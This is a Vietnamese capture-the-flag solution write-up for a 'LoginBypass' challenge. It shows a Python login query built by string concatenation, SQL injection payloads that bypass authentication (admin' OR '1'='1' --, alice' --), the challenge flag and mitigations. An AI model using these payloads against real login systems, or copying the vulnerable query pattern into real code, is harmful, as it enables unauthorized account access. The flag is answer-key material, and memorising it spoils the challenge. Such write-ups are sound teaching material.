# Thử thách 02: LoginBypass - Giải pháp

## Loại lỗ hổng
**SQL Injection (SQLi)**

## Mô tả
Ứng dụng sử dụng phương pháp nối chuỗi (string concatenation) để xây dựng truy vấn SQL mà không có bất kỳ biện pháp chuẩn hóa (sanitization) nào. Điều này khiến ứng dụng dễ bị tấn công SQL Injection.

## Mã nguồn chứa lỗ hổng
```python
query = f"SELECT * FROM users WHERE username='{u}' AND password='{hashlib.md5(p.encode()).hexdigest()}'"
```

## Khai thác (Exploit)

1. Đi đến trang đăng nhập.
2. Trong trường Tên đăng nhập (username), nhập: `admin' OR '1'='1' --`
3. Trong trường Mật khẩu (password), nhập bất kỳ chuỗi nào (ví dụ: `password`)
4. Truy vấn SQL được tạo ra sẽ trở thành:
   ```sql
   SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
   ```
5. Ký tự `--` sẽ chú thích (comment out) toàn bộ phần còn lại của câu truy vấn, và điều kiện `'1'='1'` luôn đúng.
6. Lỗi này giúp bypass cơ chế xác thực và đăng nhập bạn vào hệ thống dưới quyền người dùng đầu tiên trong bảng (alice, có quyền admin).

## Payload thay thế
```
Username: alice' --
Password: (anything)
```

## Flag
```
FCTF{sql1_1s_0ld_but_g0ld}
```

## Biện pháp phòng ngừa (Mitigation)
- Sử dụng Parameterized Queries (Truy vấn có tham số) hoặc Prepared Statements.
- Không bao giờ nối trực tiếp dữ liệu do người dùng nhập vào câu lệnh SQL.
- Luôn kiểm tra tính hợp lệ (validate) và làm sạch (sanitize) dữ liệu đầu vào.
- Nên sử dụng các framework ORM.
